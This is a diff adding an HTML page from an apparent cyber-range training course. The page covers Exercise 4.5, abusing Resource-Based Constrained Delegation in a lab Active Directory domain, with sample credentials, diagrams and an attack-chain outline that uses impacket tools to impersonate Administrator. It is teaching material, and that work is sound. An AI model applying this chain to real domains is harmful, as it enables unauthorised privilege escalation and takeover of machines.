@@ -1,0 +1,1642 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Web application penetration testing exercises for OpenCyberRange">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Exercise 4.5: Resource-Based Constrained Delegation (RBCD) - Web Application Penetration Testing</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=4">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="pink">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#exercise-45-resource-based-constrained-delegation-rbcd" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Web Application Penetration Testing" class="md-header__button md-logo" aria-label="Web Application Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Web Application Penetration Testing
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exercise 4.5: Resource-Based Constrained Delegation (RBCD)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="pink"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="pink"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Web Application Penetration Testing" class="md-nav__button md-logo" aria-label="Web Application Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Web Application Penetration Testing
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH W1 -- Web Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH W1 -- Web Reconnaissance
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/01_Basic_Directory_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.1 -- Basic Directory Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/02_Technology_Identification/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.2 -- Technology Identification
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/03_HTTP_Methods_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.3 -- HTTP Methods Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/04_Header_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.4 -- Header Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/05_Subdomain_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.5 -- Subdomain Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/06_Comprehensive_Web_Reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.6 -- Comprehensive Web Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/07_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH W2 -- Web Exploitation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH W2 -- Web Exploitation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB02_Web_Exploitation/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB02_Web_Exploitation/01_Basic_SQL_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W2.1 -- Basic SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB02_Web_Exploitation/02_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#before-you-begin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Before You Begin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#your-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Your Objectives
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Your Objectives">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-rbcd-chain-in-four-boxes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The RBCD Chain in Four Boxes
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#classic-vs-rbcd-trust-direction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Classic vs RBCD Trust Direction
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#background-why-rbcd-is-easier-to-abuse-than-classic-constrained-delegation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background: Why RBCD Is Easier to Abuse Than Classic Constrained Delegation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Background: Why RBCD Is Easier to Abuse Than Classic Constrained Delegation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ms-ds-machineaccountquota-the-unrelated-default-that-enables-rbcd-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ms-DS-MachineAccountQuota: the unrelated default that enables RBCD abuse
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-full-rbcd-attack-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The full RBCD attack chain
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tool-primer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tool Primer
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tool Primer">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#verify-machineaccountquota" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Verify MachineAccountQuota
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-a-controlled-computer-account" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Create a controlled computer account
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#write-rbcd-attribute" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Write RBCD attribute
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#s4u2self-s4u2proxy-as-the-controlled-computer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        S4U2self + S4U2proxy as the controlled computer
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#use-the-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Use the ticket
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-verify-machineaccountquota" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1: Verify MachineAccountQuota
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-create-the-controlled-computer-account" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2: Create the Controlled Computer Account
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-write-the-rbcd-attribute" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3: Write the RBCD Attribute
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-s4u2self-s4u2proxy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: S4U2self + S4U2proxy
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-read-the-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5: Read the Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-6-cleanup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 6: Cleanup
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blue-team-perspective" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blue Team Perspective
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hardening-note" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hardening Note
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Hardening Note">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#record-your-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Record Your Findings
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Analysis Questions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Takeaways
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cheat-sheet-recap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cheat Sheet Recap
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#spaced-repetition" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Spaced Repetition
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="exercise-45-resource-based-constrained-delegation-rbcd">Exercise 4.5: Resource-Based Constrained Delegation (RBCD)</h1>
+<h2 id="before-you-begin">Before You Begin</h2>
+<p>Resource-Based Constrained Delegation (RBCD) is the post-2012 evolution of constrained delegation. Instead of the <strong>source account</strong> declaring which services it can delegate to (the classic <code>msDS-AllowedToDelegateTo</code>), the <strong>target resource</strong> declares which sources are allowed to delegate to it via the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute. The trust direction reverses; the privilege required to configure changes from the rare <code>SeEnableDelegationPrivilege</code> to the much more common <code>WriteProperty</code> on the target's RBCD attribute.</p>
+<p>The default <code>ms-DS-MachineAccountQuota</code> of 10 means any authenticated user can create up to 10 computer accounts. An attacker who can write the RBCD attribute on a target computer can: create their own computer account, write that account's SID into the target's RBCD list, then S4U2self+S4U2proxy from their controlled account to impersonate any user (including Administrator) to the target.</p>
+<p>Exercise 4.5 has IT_HelpDesk granted WriteProperty on <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> of <code>WS-FIN-&lt;TOKEN&gt;</code>. j.chen is a member. Take over.</p>
+<p><strong>Tools required:</strong> <code>impacket-addcomputer</code>, <code>impacket-rbcd</code>, <code>impacket-getST</code>, <code>smbclient</code>, <code>ldapsearch</code>. Pre-installed on Kali.</p>
+<h2 id="scenario">Scenario</h2>
+<p>Marcus Bell: "RBCD is constrained delegation in reverse. Instead of asking the source account 'who can you delegate for?' you ask the target computer 'who do you trust to delegate to you?' If you can write to that attribute, you trust yourself."</p>
+<p>The flag is <code>\\WS-FIN-&lt;TOKEN&gt;\C$\rbcd_flag_&lt;token&gt;.txt</code>, readable as Administrator.</p>
+<p><strong>Credentials:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>j.chen</code></td>
+<td><code>Welcome2026#</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Domain:</strong> <code>corp.nordport.local</code></p>
+<h2 id="your-objectives">Your Objectives</h2>
+<ul>
+<li>Verify <code>ms-DS-MachineAccountQuota &gt;= 1</code></li>
+<li>Create attacker-controlled computer account <code>fakectrl_&lt;token&gt;$</code></li>
+<li>Write its SID into <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on <code>WS-FIN-&lt;TOKEN&gt;</code></li>
+<li>Use S4U2self+S4U2proxy from <code>fakectrl_&lt;token&gt;$</code> to obtain a TGS for <code>cifs/WS-FIN-&lt;TOKEN&gt;</code> as Administrator</li>
+<li>Read <code>\\WS-FIN-&lt;TOKEN&gt;\C$\rbcd_flag_&lt;token&gt;.txt</code></li>
+</ul>
+<h3 id="the-rbcd-chain-in-four-boxes">The RBCD Chain in Four Boxes</h3>
+<p>Each step writes a small change in AD; the cumulative effect is local-admin on the target. The diagram below is the chain you will execute.</p>
+<pre class="mermaid"><code>flowchart LR
+    JC["j.chen&lt;br/&gt;(starting foothold)"]
+    NC["fakectrl_&lt;token&gt;$&lt;br/&gt;(MAQ=10 lets you create)"]
+    WS["WS-FIN-&lt;TOKEN&gt;&lt;br/&gt;(target computer)"]
+    ADM["Administrator-as-source&lt;br/&gt;(forged TGS)"]
+    FLAG["C$ read as Administrator&lt;br/&gt;(rbcd_flag_&lt;token&gt;.txt)"]
+
+    JC --&gt;|addcomputer.py| NC
+    NC --&gt;|rbcd.py write SID into target| WS
+    WS --&gt;|getST.py S4U2self+S4U2proxy| ADM
+    ADM --&gt;|smbclient -k //target/C$| FLAG</code></pre>
+<h3 id="classic-vs-rbcd-trust-direction">Classic vs RBCD Trust Direction</h3>
+<p>The trust arrow flips between the two delegation styles. The diagram below shows the difference at a glance.</p>
+<pre class="mermaid"><code>flowchart LR
+    subgraph Classic["Classic constrained delegation"]
+        S1["Source: svc_deleg&lt;br/&gt;msDS-AllowedToDelegateTo = cifs/dc01"]
+        T1["Target: dc01"]
+        S1 -- "source declares the trust" --&gt; T1
+    end
+    subgraph RBCD["Resource-Based Constrained Delegation"]
+        S2["Source: fakectrl&lt;br/&gt;(any account you control)"]
+        T2["Target: ws01&lt;br/&gt;msDS-AllowedToActOnBehalfOfOtherIdentity = fakectrl"]
+        T2 -- "target declares the trust" --&gt; S2
+    end</code></pre>
+<hr />
+<h2 id="background-why-rbcd-is-easier-to-abuse-than-classic-constrained-delegation">Background: Why RBCD Is Easier to Abuse Than Classic Constrained Delegation</h2>
+<table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Classic constrained delegation</th>
+<th>RBCD</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Attribute that lists allowed services / sources</td>
+<td><code>msDS-AllowedToDelegateTo</code> (on source)</td>
+<td><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> (on target)</td>
+</tr>
+<tr>
+<td>Privilege required to configure</td>
+<td><code>SeEnableDelegationPrivilege</code> (Domain Admins / Account Operators)</td>
+<td>Any ACL right that includes WriteProperty on the target's attribute</td>
+</tr>
+<tr>
+<td>Common ACL paths</td>
+<td>Rare; tightly held</td>
+<td>Common; helpdesk groups often have GenericWrite or WriteProperty on workstations</td>
+</tr>
+<tr>
+<td>Detection signal</td>
+<td>Schema-protected attribute changes; rare</td>
+<td>Standard ACL writes; lost in noise</td>
+</tr>
+<tr>
+<td>Mitigation difficulty</td>
+<td>Medium (the attribute is rarely needed)</td>
+<td>Hard (RBCD is widely used for legitimate Windows servicing)</td>
+</tr>
+</tbody>
+</table>
+<p>The shift from source-side to target-side configuration is what makes RBCD a frequent finding. Helpdesk teams routinely have GenericWrite on workstation OUs (so they can rename machines, push GPOs, etc.); GenericWrite includes WriteProperty on every attribute, including the RBCD one.</p>
+<h3 id="ms-ds-machineaccountquota-the-unrelated-default-that-enables-rbcd-abuse">ms-DS-MachineAccountQuota: the unrelated default that enables RBCD abuse</h3>
+<p><code>ms-DS-MachineAccountQuota</code> defaults to 10. The quota means <strong>every authenticated user can create up to 10 computer accounts in the domain</strong>. The intent is to support self-service domain join (a user joins their workstation to the domain). The side effect is that any compromised account can create a controlled computer account whose password it knows.</p>
+<p>The defender control is to set <code>ms-DS-MachineAccountQuota = 0</code> and grant computer-creation rights only to a specific provisioning account. Most environments leave the default in place because changing it breaks self-service domain join workflows.</p>
+<h3 id="the-full-rbcd-attack-chain">The full RBCD attack chain</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>1. addcomputer.py: create fakectrl_&lt;token&gt;$ with a known password
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>2. rbcd.py write: add fakectrl_&lt;token&gt;$&#39;s SID to WS-FIN-&lt;TOKEN&gt;&#39;s
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>   msDS-AllowedToActOnBehalfOfOtherIdentity
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>3. getST.py with the controlled account credentials, S4U flow:
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>     S4U2self -&gt; get a TGS for fakectrl_&lt;token&gt;$-as-Administrator
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>     S4U2proxy -&gt; get a TGS for cifs/WS-FIN-&lt;TOKEN&gt;-as-Administrator
